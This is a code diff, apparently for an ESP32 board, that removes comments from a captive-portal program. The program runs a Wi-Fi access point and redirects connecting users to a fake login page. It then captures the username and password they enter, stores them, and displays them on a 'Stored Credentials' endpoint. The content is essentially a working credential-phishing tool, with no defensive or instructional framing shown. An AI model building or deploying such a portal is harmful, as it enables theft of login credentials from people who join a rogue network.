@@ -8,12 +8,10 @@ const char* password = "";
 WebServer server(80);
 DNSServer dnsServer;
 
-// Variables defined to store credentials
 String storedUsername = "";
 String storedPassword = "";
 
 void FuncCaptivePortal() {
-  // Function to redirect to the login portal as soon as the user is connected to the Wi-Fi
   server.sendHeader("Location", String("http://") + WiFi.softAPIP().toString(), true);
   server.send(302, "text/plain", "Redirecting to login...");
 }
@@ -29,7 +27,7 @@ const char* loginPage = R"rawliteral(
     </style>
     <script>
       function sendCredentials(event) {
-        event.preventDefault(); // Prevent page reload
+        event.preventDefault();
 
         let username = document.getElementById("username").value;
         let password = document.getElementById("password").value;
@@ -66,12 +64,10 @@ const char* loginPage = R"rawliteral(
 </html>
 )rawliteral";
 
-// Serve the login page
 void FuncHandleRoot() {
   server.send(200, "text/html", loginPage);
 }
 
-// Handle credential submission (POST)
 void FuncPostCreds() {
   Serial.println("Received a POST request at /getCreds");
 
@@ -91,7 +87,6 @@ void FuncPostCreds() {
   server.send(400, "text/plain", "Error: Missing credentials.");
 }
 
-// Handle GET request to display stored credentials
 void FuncGetCreds() {
   String response = "<html><head><title>Stored Credentials</title></head><body>";
   response += "<h2>Stored Credentials</h2>";
@@ -103,7 +98,6 @@ void FuncGetCreds() {
   server.send(200, "text/html", response);
 }
 
-// Handle 404 errors
 void FuncNotFound() {
   Serial.println("Client requested: " + server.uri());
   server.send(404, "text/plain", "404: Not Found");
